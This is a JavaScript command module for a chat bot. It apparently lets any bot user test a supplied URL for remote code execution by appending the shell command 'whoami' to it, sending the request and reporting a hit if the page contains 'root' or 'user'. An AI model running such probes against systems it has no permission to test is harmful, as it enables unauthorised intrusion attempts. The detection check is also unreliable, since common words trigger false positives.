const { sendMessage } = require('../handles/sendMessage');
const axios = require('axios');
                                                           module.exports = {
   name: 'rce',
   description: 'Test a URL for Remote Code Execution (RCE) vulnerability',                                              usage: 'rce <url>',
   author: 'Mota - Dev',                                   
   async execute(senderId, args, token) {
      const url = args[0];
      if (!url) {                                                   return sendMessage(senderId, { text: "Please provide a URL to test for RCE (e.g., https://example.com?cmd=)." }, token);
      }

      const payload = "whoami"; // Basic RCE payload
      const testUrl = `${url}${encodeURIComponent(payload)}`;
      try {
         const response = await axios.get(testUrl);
         if (response.data.includes("root") || response.data.includes("user")) {
            return sendMessage(senderId, { text: `RCE Vulnerability Detected! Payload: ${testUrl}` }, token);
         } else {
            return sendMessage(senderId, { text: "No RCE vulnerability detected." }, token);
         }
      } catch (error) {
         console.error("Error during RCE test:", error);
         return sendMessage(senderId, { text: "Failed to test for RCE. Please try again later." }, token);
      }
   }
};
